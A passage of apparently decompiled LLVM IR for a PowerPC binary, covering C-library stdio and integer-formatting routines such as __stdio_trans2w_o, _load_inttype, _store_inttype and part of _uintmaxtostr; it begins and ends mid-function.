  %v3_100109d4 = load i32, i32* %v2_100109d4, align 4
  %v0_100109d8 = load i32, i32* @r28, align 4
  %v1_100109d8 = load i32, i32* @r31, align 4
  %v2_100109d8 = sub i32 %v0_100109d8, %v3_100109c8
  %v2_100109dc = add i32 %v2_100109d8, %v1_100109d8
  %v2_100109e0 = sub i32 %v3_100109d4, %v2_100109dc
  %v1_100109e4 = load i32, i32* @r29, align 4
  %v2_100109e4 = sub i32 %v1_100109e4, %v2_100109dc
  store i32 %v2_100109e4, i32* @r29, align 4
  store i32 %v2_100109e0, i32* %v2_100109d4, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_100109f0:                            ; preds = %dec_label_pc_1001094c
  %v2_100109f0 = add i32 %tmp, 8
  %v3_100109f0 = inttoptr i32 %v2_100109f0 to i32*
  %v4_100109f0 = load i32, i32* %v3_100109f0, align 4
  %v4_100109f4 = icmp eq i32 %v4_1001090c, %v4_100109f0
  br i1 %v4_100109f4, label %dec_label_pc_10010a14, label %dec_label_pc_100109fc

dec_label_pc_100109fc:                            ; preds = %dec_label_pc_100109f0
  store i32 %tmp, i32* @r3, align 4
  store i32 268503556, i32* @lr, align 4
  %v0_10010a00 = call i32 @__stdio_wcommit()
  %v3_10010a04 = icmp eq i32 %v0_10010a00, 0
  br i1 %v3_10010a04, label %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge, label %dec_label_pc_10010a0c

dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge: ; preds = %dec_label_pc_100109fc
  %v0_10010a18.pre = load i32, i32* @r30, align 4
  %v0_10010a1c.pre = load i32, i32* @r28, align 4
  %v0_10010a20.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010a14

dec_label_pc_10010a0c:                            ; preds = %dec_label_pc_100109fc
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_10010a14:                            ; preds = %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge, %entry, %dec_label_pc_100109f0
  %v0_10010a20 = phi i32 [ %v0_10010a20.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_100109f0 ]
  %v0_10010a1c = phi i32 [ %v0_10010a1c.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_100109f0 ]
  %v0_10010a18 = phi i32 [ %v0_10010a18.pre, %dec_label_pc_100109fc.dec_label_pc_10010a14_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_100109f0 ]
  %v1_10010a18 = inttoptr i32 %v0_10010a18 to i16*
  store i32 %v0_10010a20, i32* @r5, align 4
  store i32 %v0_100108e0, i32* @lr, align 4
  %v5_10010a30 = call i32 @__stdio_WRITE(i16* %v1_10010a18, i32 %v0_10010a1c)
  br label %dec_label_pc_10010a34

dec_label_pc_10010a34:                            ; preds = %dec_label_pc_100109a4, %dec_label_pc_10010994, %dec_label_pc_1001097c, %dec_label_pc_10010958, %dec_label_pc_10010a0c, %dec_label_pc_100109d4, %dec_label_pc_10010930, %dec_label_pc_10010a14
  %v0_10010a38 = load i32, i32* @r29, align 4
  ret i32 %v0_10010a38

; uselistorder directives
  uselistorder i32 %v2_100109dc, { 1, 0 }
  uselistorder i32 %v0_10010998.v0_100109a8, { 0, 2, 1 }
  uselistorder i32 %v0_100109a4, { 1, 0, 2 }
  uselistorder i32 %v2_1001091c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10010a34, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10010a14, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010930, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10010a4c = load i32, i32* @lr, align 4
  store i32 %v0_10010a4c, i32* %r0.global-to-local, align 4
  %v0_10010a54 = load i32, i32* @r31, align 4
  %v0_10010a58 = load i32, i32* @r3, align 4
  store i32 %v0_10010a58, i32* @r31, align 4
  %v1_10010a60 = inttoptr i32 %v0_10010a58 to i16*
  %v2_10010a60 = load i16, i16* %v1_10010a60, align 2
  %v3_10010a60 = zext i16 %v2_10010a60 to i32
  store i32 %v3_10010a60, i32* %r0.global-to-local, align 4
  %v1_10010a64 = load i32, i32* @r4, align 4
  %v2_10010a64 = and i32 %v1_10010a64, %v3_10010a60
  store i32 %v2_10010a64, i32* %r9.global-to-local, align 4
  %v5_10010a64 = icmp eq i32 %v2_10010a64, 0
  br i1 %v5_10010a64, label %dec_label_pc_10010a6c, label %dec_label_pc_10010a7c

dec_label_pc_10010a6c:                            ; preds = %entry
  %v1_10010a6c = and i32 %v3_10010a60, 2176
  store i32 %v1_10010a6c, i32* %r9.global-to-local, align 4
  %v3_10010a6c = icmp eq i32 %v1_10010a6c, 0
  br i1 %v3_10010a6c, label %dec_label_pc_10010a74, label %dec_label_pc_10010a88

dec_label_pc_10010a74:                            ; preds = %dec_label_pc_10010a6c
  %v2_10010a74 = or i32 %v1_10010a64, %v3_10010a60
  store i32 %v2_10010a74, i32* %r0.global-to-local, align 4
  %v1_10010a78 = trunc i32 %v2_10010a74 to i16
  store i16 %v1_10010a78, i16* %v1_10010a60, align 2
  %v0_10010a7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010a7c

dec_label_pc_10010a7c:                            ; preds = %entry, %dec_label_pc_10010a74
  %v0_10010ab8 = phi i32 [ %v0_10010a58, %entry ], [ %v0_10010a7c.pre, %dec_label_pc_10010a74 ]
  %v1_10010a7c = inttoptr i32 %v0_10010ab8 to i16*
  %v2_10010a7c = load i16, i16* %v1_10010a7c, align 2
  %v3_10010a7c = zext i16 %v2_10010a7c to i32
  %v1_10010a80 = and i32 %v3_10010a7c, 32
  store i32 %v1_10010a80, i32* %r0.global-to-local, align 4
  %v3_10010a80 = icmp eq i32 %v1_10010a80, 0
  br i1 %v3_10010a80, label %dec_label_pc_10010aa8, label %dec_label_pc_10010a88

dec_label_pc_10010a88:                            ; preds = %dec_label_pc_10010a6c, %dec_label_pc_10010a7c
  %v0_10010a88 = call i32 @__errno_location()
  store i32 %v0_10010a88, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10010a90 = inttoptr i32 %v0_10010a88 to i32*
  store i32 9, i32* %v2_10010a90, align 4
  br label %dec_label_pc_10010a94

dec_label_pc_10010a94:                            ; preds = %dec_label_pc_10010ad0, %dec_label_pc_10010a88
  %v0_10010a94 = load i32, i32* @r31, align 4
  %v1_10010a94 = inttoptr i32 %v0_10010a94 to i16*
  %v2_10010a94 = load i16, i16* %v1_10010a94, align 2
  %v3_10010a94 = zext i16 %v2_10010a94 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10010a9c = or i32 %v3_10010a94, 8
  store i32 %v1_10010a9c, i32* %r0.global-to-local, align 4
  %v1_10010aa0 = trunc i32 %v1_10010a9c to i16
  store i16 %v1_10010aa0, i16* %v1_10010a94, align 2
  br label %dec_label_pc_10010b30

dec_label_pc_10010aa8:                            ; preds = %dec_label_pc_10010a7c
  %tmp = urem i16 %v2_10010a7c, 4
  %v1_10010aa8 = zext i16 %tmp to i32
  store i32 %v1_10010aa8, i32* %r0.global-to-local, align 4
  %v3_10010aa8 = icmp eq i16 %tmp, 0
  br i1 %v3_10010aa8, label %dec_label_pc_10010b0c, label %dec_label_pc_10010ab0

dec_label_pc_10010ab0:                            ; preds = %dec_label_pc_10010aa8
  %v1_10010ab0 = and i32 %v3_10010a7c, 4
  store i32 %v1_10010ab0, i32* %r9.global-to-local, align 4
  %v3_10010ab0 = icmp eq i32 %v1_10010ab0, 0
  br i1 %v3_10010ab0, label %dec_label_pc_10010ab8, label %dec_label_pc_10010af0

dec_label_pc_10010ab8:                            ; preds = %dec_label_pc_10010ab0
  %v1_10010ab8 = add i32 %v0_10010ab8, 20
  %v2_10010ab8 = inttoptr i32 %v1_10010ab8 to i32*
  %v3_10010ab8 = load i32, i32* %v2_10010ab8, align 4
  store i32 %v3_10010ab8, i32* %r0.global-to-local, align 4
  %v1_10010abc = add i32 %v0_10010ab8, 16
  %v2_10010abc = inttoptr i32 %v1_10010abc to i32*
  %v3_10010abc = load i32, i32* %v2_10010abc, align 4
  store i32 %v3_10010abc, i32* %r9.global-to-local, align 4
  %v4_10010ac0 = icmp eq i32 %v3_10010ab8, %v3_10010abc
  br i1 %v4_10010ac0, label %dec_label_pc_10010ac8, label %dec_label_pc_10010ad0

dec_label_pc_10010ac8:                            ; preds = %dec_label_pc_10010ab8
  %v1_10010ac8 = and i32 %v3_10010a7c, 2
  store i32 %v1_10010ac8, i32* %r0.global-to-local, align 4
  %v3_10010ac8 = icmp eq i32 %v1_10010ac8, 0
  br i1 %v3_10010ac8, label %dec_label_pc_10010af0, label %dec_label_pc_10010ad0

dec_label_pc_10010ad0:                            ; preds = %dec_label_pc_10010ab8, %dec_label_pc_10010ac8
  %v1_10010ad0 = and i32 %v3_10010a7c, 1024
  store i32 %v1_10010ad0, i32* %r9.global-to-local, align 4
  %v0_10010ad8 = call i32 @__asm_mfcr()
  store i32 %v0_10010ad8, i32* %r3.global-to-local, align 4
  %v1_10010adc = call i32 @__asm_rlwinm(i32 %v0_10010ad8, i32 3, i32 31, i32 31)
  %v1_10010ae0 = sub i32 2, %v1_10010adc
  store i32 %v1_10010ae0, i32* @r5, align 4
  store i32 268503784, i32* @lr, align 4
  %v1_10010ae4 = call i32 @__GI_fseek(i32 %v1_10010ae0)
  store i32 %v1_10010ae4, i32* %r3.global-to-local, align 4
  %v3_10010ae8 = icmp eq i32 %v1_10010ae4, 0
  br i1 %v3_10010ae8, label %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge, label %dec_label_pc_10010a94

dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge: ; preds = %dec_label_pc_10010ad0
  %v0_10010af0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010af0

dec_label_pc_10010af0:                            ; preds = %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge, %dec_label_pc_10010ab0, %dec_label_pc_10010ac8
  %v0_10010af0 = phi i32 [ %v0_10010af0.pre, %dec_label_pc_10010ad0.dec_label_pc_10010af0_crit_edge ], [ %v0_10010ab8, %dec_label_pc_10010ab0 ], [ %v0_10010ab8, %dec_label_pc_10010ac8 ]
  %v1_10010af0 = inttoptr i32 %v0_10010af0 to i16*
  %v2_10010af0 = load i16, i16* %v1_10010af0, align 2
  %v3_10010af0 = zext i16 %v2_10010af0 to i32
  store i32 %v3_10010af0, i32* %r0.global-to-local, align 4
  %v1_10010af4 = add i32 %v0_10010af0, 8
  %v2_10010af4 = inttoptr i32 %v1_10010af4 to i32*
  %v3_10010af4 = load i32, i32* %v2_10010af4, align 4
  store i32 %v3_10010af4, i32* %r9.global-to-local, align 4
  %v1_10010af8 = call i32 @__asm_rlwinm(i32 %v3_10010af0, i32 0, i32 0, i32 29)
  %v2_10010af8 = trunc i32 %v1_10010af8 to i16
  store i32 %v1_10010af8, i32* %r0.global-to-local, align 4
  %v3_10010afc = load i32, i32* @r31, align 4
  %v4_10010afc = inttoptr i32 %v3_10010afc to i16*
  store i16 %v2_10010af8, i16* %v4_10010afc, align 2
  %v0_10010b00 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b00 = load i32, i32* @r31, align 4
  %v2_10010b00 = add i32 %v1_10010b00, 20
  %v3_10010b00 = inttoptr i32 %v2_10010b00 to i32*
  store i32 %v0_10010b00, i32* %v3_10010b00, align 4
  %v0_10010b04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b04 = load i32, i32* @r31, align 4
  %v2_10010b04 = add i32 %v1_10010b04, 24
  %v3_10010b04 = inttoptr i32 %v2_10010b04 to i32*
  store i32 %v0_10010b04, i32* %v3_10010b04, align 4
  %v0_10010b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b08 = load i32, i32* @r31, align 4
  %v2_10010b08 = add i32 %v1_10010b08, 16
  %v3_10010b08 = inttoptr i32 %v2_10010b08 to i32*
  store i32 %v0_10010b08, i32* %v3_10010b08, align 4
  %v0_10010b0c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010b0c

dec_label_pc_10010b0c:                            ; preds = %dec_label_pc_10010aa8, %dec_label_pc_10010af0
  %v2_10010b18 = phi i32 [ %v0_10010ab8, %dec_label_pc_10010aa8 ], [ %v0_10010b0c.pre, %dec_label_pc_10010af0 ]
  %v1_10010b0c = inttoptr i32 %v2_10010b18 to i16*
  %v2_10010b0c = load i16, i16* %v1_10010b0c, align 2
  %v3_10010b0c = zext i16 %v2_10010b0c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010b14 = or i32 %v3_10010b0c, 64
  store i32 %v1_10010b14, i32* %r0.global-to-local, align 4
  %v1_10010b18 = trunc i32 %v1_10010b14 to i16
  store i16 %v1_10010b18, i16* %v1_10010b0c, align 2
  %v0_10010b1c = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b1c = urem i32 %v0_10010b1c, 65536
  store i32 %v1_10010b1c, i32* %r0.global-to-local, align 4
  %v1_10010b20 = and i32 %v0_10010b1c, 2816
  store i32 %v1_10010b20, i32* %r9.global-to-local, align 4
  %v3_10010b20 = icmp eq i32 %v1_10010b20, 0
  br i1 %v3_10010b20, label %dec_label_pc_10010b28, label %dec_label_pc_10010b30

dec_label_pc_10010b28:                            ; preds = %dec_label_pc_10010b0c
  %v0_10010b28 = load i32, i32* @r31, align 4
  %v1_10010b28 = add i32 %v0_10010b28, 12
  %v2_10010b28 = inttoptr i32 %v1_10010b28 to i32*
  %v3_10010b28 = load i32, i32* %v2_10010b28, align 4
  store i32 %v3_10010b28, i32* %r0.global-to-local, align 4
  %v2_10010b2c = add i32 %v0_10010b28, 28
  %v3_10010b2c = inttoptr i32 %v2_10010b2c to i32*
  store i32 %v3_10010b28, i32* %v3_10010b2c, align 4
  br label %dec_label_pc_10010b30

dec_label_pc_10010b30:                            ; preds = %dec_label_pc_10010b0c, %dec_label_pc_10010a94, %dec_label_pc_10010b28
  store i32 %v0_10010a4c, i32* %r0.global-to-local, align 4
  store i32 %v0_10010a54, i32* @r31, align 4
  %v0_10010b40 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010b40

; uselistorder directives
  uselistorder i32 %v0_10010b1c, { 1, 0 }
  uselistorder i32 %v1_10010af8, { 1, 0 }
  uselistorder i32 %v0_10010af0, { 1, 0 }
  uselistorder i32 %v0_10010ab8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_10010a60, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10010b30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10010af0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010ad0, { 1, 0 }
  uselistorder label %dec_label_pc_10010a88, { 1, 0 }
  uselistorder label %dec_label_pc_10010a7c, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10010b44 = load i32, i32* @r5, align 4
  %v1_10010b44 = icmp slt i32 %v0_10010b44, 0
  %v1_10010b48 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10010b84 = icmp eq i32 %v1_10010b48, 0
  br i1 %v1_10010b44, label %dec_label_pc_10010b84, label %dec_label_pc_10010b50

dec_label_pc_10010b50:                            ; preds = %entry
  br i1 %v3_10010b84, label %dec_label_pc_10010b58, label %dec_label_pc_10010b8c

dec_label_pc_10010b58:                            ; preds = %dec_label_pc_10010b50
  %v3_10010b58 = icmp eq i32 %arg1, 256
  br i1 %v3_10010b58, label %dec_label_pc_10010b64, label %dec_label_pc_10010b6c

dec_label_pc_10010b64:                            ; preds = %dec_label_pc_10010b58
  br label %dec_label_pc_10010b78

dec_label_pc_10010b6c:                            ; preds = %dec_label_pc_10010b58
  %v3_10010b6c = icmp eq i32 %arg1, 512
  br i1 %v3_10010b6c, label %dec_label_pc_10010b74, label %dec_label_pc_10010b78

dec_label_pc_10010b74:                            ; preds = %dec_label_pc_10010b6c
  br label %dec_label_pc_10010b78

dec_label_pc_10010b78:                            ; preds = %dec_label_pc_10010b6c, %dec_label_pc_10010b64, %dec_label_pc_10010b74
  ret i32 0

dec_label_pc_10010b84:                            ; preds = %entry
  br i1 %v3_10010b84, label %dec_label_pc_10010b98, label %dec_label_pc_10010b8c

dec_label_pc_10010b8c:                            ; preds = %dec_label_pc_10010b50, %dec_label_pc_10010b84
  %v2_10010b8c = load i32, i32* %arg2, align 4
  ret i32 %v2_10010b8c

dec_label_pc_10010b98:                            ; preds = %dec_label_pc_10010b84
  %v3_10010b98 = icmp eq i32 %arg1, 256
  %v2_10010b9c = load i32, i32* %arg2, align 4
  br i1 %v3_10010b98, label %dec_label_pc_10010ba4, label %dec_label_pc_10010bac

dec_label_pc_10010ba4:                            ; preds = %dec_label_pc_10010b98
  %v1_10010ba4 = urem i32 %v2_10010b9c, 256
  br label %dec_label_pc_10010bb8

dec_label_pc_10010bac:                            ; preds = %dec_label_pc_10010b98
  %v3_10010bac = icmp eq i32 %arg1, 512
  br i1 %v3_10010bac, label %dec_label_pc_10010bb4, label %dec_label_pc_10010bb8

dec_label_pc_10010bb4:                            ; preds = %dec_label_pc_10010bac
  %v1_10010bb4 = mul i32 %v2_10010b9c, 65536
  %v2_10010bb4 = sdiv i32 %v1_10010bb4, 65536
  br label %dec_label_pc_10010bb8

dec_label_pc_10010bb8:                            ; preds = %dec_label_pc_10010bac, %dec_label_pc_10010ba4, %dec_label_pc_10010bb4
  %v0_10010bb8 = phi i32 [ %v2_10010b9c, %dec_label_pc_10010bac ], [ %v1_10010ba4, %dec_label_pc_10010ba4 ], [ %v2_10010bb4, %dec_label_pc_10010bb4 ]
  %tmp = icmp slt i32 %v0_10010bb8, 0
  %v1_10010bbc = zext i1 %tmp to i32
  %v2_10010bbc = ashr i32 %v0_10010bb8, 31
  %v3_10010bbc = and i32 %v2_10010bbc, -2
  %v4_10010bbc = or i32 %v3_10010bbc, %v1_10010bbc
  ret i32 %v4_10010bbc

; uselistorder directives
  uselistorder i32 %v0_10010bb8, { 1, 0 }
  uselistorder i32 %v2_10010b9c, { 2, 0, 1 }
  uselistorder i1 %v3_10010b84, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_10010bb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10010b78, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10010bc4 = load i32, i32* @r4, align 4
  %v3_10010bc4 = icmp eq i32 %v0_10010bc4, 256
  br i1 %v3_10010bc4, label %dec_label_pc_10010bd0, label %dec_label_pc_10010bd8

dec_label_pc_10010bd0:                            ; preds = %entry
  %v0_10010bd0 = load i32, i32* @r6, align 4
  %v1_10010bd0 = trunc i32 %v0_10010bd0 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10010bd0, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10010bd8:                            ; preds = %entry
  %v3_10010bc8 = icmp eq i32 %v0_10010bc4, 2048
  br i1 %v3_10010bc8, label %dec_label_pc_10010be0, label %dec_label_pc_10010bec

dec_label_pc_10010be0:                            ; preds = %dec_label_pc_10010bd8
  %v0_10010be0 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10010be0, i32* %tmp2, align 4
  %v0_10010be4 = load i32, i32* @r6, align 4
  %v3_10010be4 = add i32 %tmp, 4
  %v4_10010be4 = inttoptr i32 %v3_10010be4 to i32*
  store i32 %v0_10010be4, i32* %v4_10010be4, align 4
  ret i32 %tmp

dec_label_pc_10010bec:                            ; preds = %dec_label_pc_10010bd8
  %v3_10010bd8 = icmp eq i32 %v0_10010bc4, 512
  %v0_10010bf0 = load i32, i32* @r6, align 4
  br i1 %v3_10010bd8, label %dec_label_pc_10010bf0, label %dec_label_pc_10010bf8

dec_label_pc_10010bf0:                            ; preds = %dec_label_pc_10010bec
  %v1_10010bf0 = trunc i32 %v0_10010bf0 to i16
  store i16 %v1_10010bf0, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10010bf8:                            ; preds = %dec_label_pc_10010bec
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10010bf0, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10010c00 = load i32, i32* @r7, align 4
  %v3_10010c00 = icmp eq i32 %v0_10010c00, 0
  store i1 %v3_10010c00, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_10010c00, -1
  br i1 %tmp12, label %dec_label_pc_10010c34, label %dec_label_pc_10010c14

dec_label_pc_10010c14:                            ; preds = %entry
  %v0_10010c14 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010c18 = sub i32 0, %v0_10010c00
  store i32 %v1_10010c18, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_10010c14, -1
  br i1 %tmp13, label %dec_label_pc_10010c34, label %dec_label_pc_10010c20

dec_label_pc_10010c20:                            ; preds = %dec_label_pc_10010c14
  %v0_10010c20 = load i32, i32* %r6.global-to-local, align 4
  %v1_10010c20 = sub i32 0, %v0_10010c20
  %v2_10010c20 = sub i32 -1, %v0_10010c20
  store i32 %v1_10010c20, i32* %r6.global-to-local, align 4
  %v4_10010c20 = icmp uge i32 %v2_10010c20, %v1_10010c20
  %v1_10010c24 = sub i32 -1, %v0_10010c14
  %v3_10010c24 = zext i1 %v4_10010c20 to i32
  %v4_10010c24 = add i32 %v3_10010c24, %v1_10010c24
  store i32 %v4_10010c24, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010c34

dec_label_pc_10010c34:                            ; preds = %entry, %dec_label_pc_10010c14, %dec_label_pc_10010c20
  %v1_10010c38 = phi i32 [ %v1_10010c18, %dec_label_pc_10010c20 ], [ %v1_10010c18, %dec_label_pc_10010c14 ], [ %v0_10010c00, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10010c20 ], [ 0, %dec_label_pc_10010c14 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10010c38 = udiv i32 -1, %v1_10010c38
  store i32 %v2_10010c38, i32* @r8, align 4
  %v2_10010c40 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010c40 = inttoptr i32 %v2_10010c40 to i8*
  store i8 0, i8* %v3_10010c40, align 1
  %v0_10010c44 = load i32, i32* @r8, align 4
  %v1_10010c44 = load i32, i32* @r7, align 4
  %v2_10010c44 = mul i32 %v1_10010c44, %v0_10010c44
  %v1_10010c48 = sub i32 0, %v2_10010c44
  store i32 %v1_10010c48, i32* @r31, align 4
  %v4_10010c4c = icmp eq i32 %v1_10010c44, %v1_10010c48
  br i1 %v4_10010c4c, label %dec_label_pc_10010c54, label %dec_label_pc_10010c5c

dec_label_pc_10010c54:                            ; preds = %dec_label_pc_10010c34
  %v1_10010c54 = add i32 %v0_10010c44, 1
  store i32 %v1_10010c54, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10010c5c

dec_label_pc_10010c5c:                            ; preds = %dec_label_pc_10010c34, %dec_label_pc_10010c54
  %v0_10010c5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10010c5c, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10010c60

dec_label_pc_10010c60thread-pre-split:            ; preds = %dec_label_pc_10010cb4
  %v0_10010c60.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10010c64.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10010c60

dec_label_pc_10010c60:                            ; preds = %dec_label_pc_10010c60thread-pre-split, %dec_label_pc_10010c5c
  %v1_10010ca8 = phi i32 [ %v1_10010c64.pre, %dec_label_pc_10010c60thread-pre-split ], [ %v1_10010c44, %dec_label_pc_10010c5c ]
  %v1_10010c78 = phi i32 [ %v0_10010c60.pr, %dec_label_pc_10010c60thread-pre-split ], [ %v0_10010c5c, %dec_label_pc_10010c5c ]
  %v3_10010c60 = icmp eq i32 %v1_10010c78, 0
  %v0_10010c64 = load i32, i32* %r6.global-to-local, align 4
  %v2_10010c64 = udiv i32 %v0_10010c64, %v1_10010ca8
  br i1 %v3_10010c60, label %dec_label_pc_10010ca8, label %dec_label_pc_10010c6c

dec_label_pc_10010c6c:                            ; preds = %dec_label_pc_10010c60
  %v2_10010c6c = udiv i32 %v1_10010c78, %v1_10010ca8
  %v2_10010c70 = mul i32 %v2_10010c6c, %v1_10010ca8
  %v2_10010c74 = mul i32 %v2_10010c64, %v1_10010ca8
  %v2_10010c78 = sub i32 %v1_10010c78, %v2_10010c70
  store i32 %v2_10010c6c, i32* %r12.global-to-local, align 4
  %v0_10010c80 = load i32, i32* @r31, align 4
  %v2_10010c80 = mul i32 %v0_10010c80, %v2_10010c78
  %v2_10010c84 = sub i32 %v0_10010c64, %v2_10010c74
  %v2_10010c88 = add i32 %v2_10010c80, %v2_10010c84
  %v0_10010c8c = load i32, i32* @r8, align 4
  %v2_10010c8c = mul i32 %v0_10010c8c, %v2_10010c78
  %v2_10010c90 = udiv i32 %v2_10010c88, %v1_10010ca8
  %v2_10010c94 = add i32 %v2_10010c8c, %v2_10010c64
  %v2_10010c98 = mul i32 %v2_10010c90, %v1_10010ca8
  %v2_10010c9c = add i32 %v2_10010c94, %v2_10010c90
  store i32 %v2_10010c9c, i32* %r6.global-to-local, align 4
  %v2_10010ca0 = sub i32 %v2_10010c88, %v2_10010c98
  store i32 %v2_10010ca0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010ca8:                            ; preds = %dec_label_pc_10010c60
  %v2_10010ca8 = mul i32 %v2_10010c64, %v1_10010ca8
  %v2_10010cac = sub i32 %v0_10010c64, %v2_10010ca8
  store i32 %v2_10010cac, i32* %r5.global-to-local, align 4
  store i32 %v2_10010c64, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010cb4:                            ; preds = %dec_label_pc_10010c6c, %dec_label_pc_10010ca8
  %v1_10010cb8 = phi i32 [ %v2_10010c6c, %dec_label_pc_10010c6c ], [ 0, %dec_label_pc_10010ca8 ]
  %v0_10010cb8 = phi i32 [ %v2_10010c9c, %dec_label_pc_10010c6c ], [ %v2_10010c64, %dec_label_pc_10010ca8 ]
  %v0_10010cbc = phi i32 [ %v2_10010ca0, %dec_label_pc_10010c6c ], [ %v2_10010cac, %dec_label_pc_10010ca8 ]
  %v2_10010cb8 = or i32 %v0_10010cb8, %v1_10010cb8
  %v5_10010cb8 = icmp eq i32 %v2_10010cb8, 0
  store i1 %v5_10010cb8, i1* %cr0_eq.global-to-local, align 1
  %v1_10010cc0 = load i32, i32* @r30, align 4
  %v0_10010cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010cc4 = add i32 %v0_10010cc4, -1
  store i32 %v1_10010cc4, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10010cbc, 10
  %v1_10010cbc.v2_10010cc0.v = select i1 %tmp14, i32 48, i32 %v1_10010cc0
  %v1_10010cbc.v2_10010cc0 = add i32 %v0_10010cbc, %v1_10010cbc.v2_10010cc0.v
  %extract.t9.extract.t = trunc i32 %v1_10010cbc.v2_10010cc0 to i8
  %v3_10010cd4 = inttoptr i32 %v1_10010cc4 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10010cd4, align 1
  %v0_10010cd8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10010cd8, label %dec_label_pc_10010cdc, label %dec_label_pc_10010c60thread-pre-split

dec_label_pc_10010cdc:                            ; preds = %dec_label_pc_10010cb4
  %v0_10010cdc = load i32, i32* @r29, align 4
  %v3_10010cdc = icmp eq i32 %v0_10010cdc, 0
  br i1 %v3_10010cdc, label %dec_label_pc_10010cdc.dec_label_pc_10010cec_crit_edge, label %dec_label_pc_10010ce4

dec_label_pc_10010cdc.dec_label_pc_10010cec_crit_edge: ; preds = %dec_label_pc_10010cdc
